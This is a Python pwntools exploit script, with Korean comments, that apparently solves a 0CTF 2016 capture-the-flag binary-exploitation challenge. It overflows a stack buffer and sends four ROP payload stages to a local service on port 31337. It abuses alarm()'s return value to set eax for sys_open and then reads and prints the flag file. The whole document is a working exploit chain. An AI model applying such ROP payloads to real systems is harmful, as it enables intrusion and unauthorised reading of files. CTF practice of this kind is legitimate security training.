from pwn import *
from time import *

# stack overflow가 발생하는 구간이 있어서 ROP Chaining이 가능했다.
# 파일을 읽어들이기 위해서 sys_open를 호출하는 것이 관건이었는데 도저히 생각이 안나다가
# alarm함수의 반환값이 이전에 설정된 알람이 시그널을 전달할때까지 남은 시간을 초단위 숫자로 반환한다고 되어있다.
# 따라서 5초있다가 alarm함수를 재호출하면 eax가 5로 세팅되므로 sys_open를 호출할 수 있는 조건이 마련이 된 셈이다.
# 그후로는 딱히 어려운게 없었다.

sh = remote("localhost", 31337)
free_space = 0x08049330
return_vuln_func = 0x0804815a
control_ebx_ecx_edx = 0x0804813a
flag_path = "flag" + "\x00\x00\x00\x00"

sys_read = 0x0804811d
sys_write = 0x08048135
sys_alarm = 0x0804810d
sys_exit = 0x0804814d

sh.recvuntil("Welcome to 0CTF 2016!")
# first stage, save flag path
payload = ""
payload += "a"*32
payload += p32(sys_read)
payload += p32(return_vuln_func)
payload += p32(0)
payload += p32(free_space)
payload += p32(len(flag_path))
sh.sendline(payload)
print sh.recvuntil("Good Luck!")
#raw_input()

sleep(10)
# second stage, open flag
payload = ""
payload += "a"*32
payload += p32(sys_alarm)
payload += p32(control_ebx_ecx_edx)
payload += p32(return_vuln_func)
payload += p32(free_space)
payload += p32(1)
sh.sendline(payload)
print sh.recvuntil("Good Luck!")
#raw_input()

# third stage, read contents
payload = ""
payload += "a"*32
payload += p32(sys_read)
payload += p32(return_vuln_func)
payload += p32(6)
payload += p32(free_space + 0x10)
payload += p32(2)
sh.sendline(payload)
print sh.recvuntil("Good Luck!")

# fourth stage, print flag
payload = ""
payload += "a"*32
payload += p32(sys_write)
payload += p32(return_vuln_func)
payload += p32(1)
payload += p32(free_space + 0x10)
payload += p32(2)
sh.sendline(payload)
print sh.recvuntil("Good Luck!")

print sh.recv()

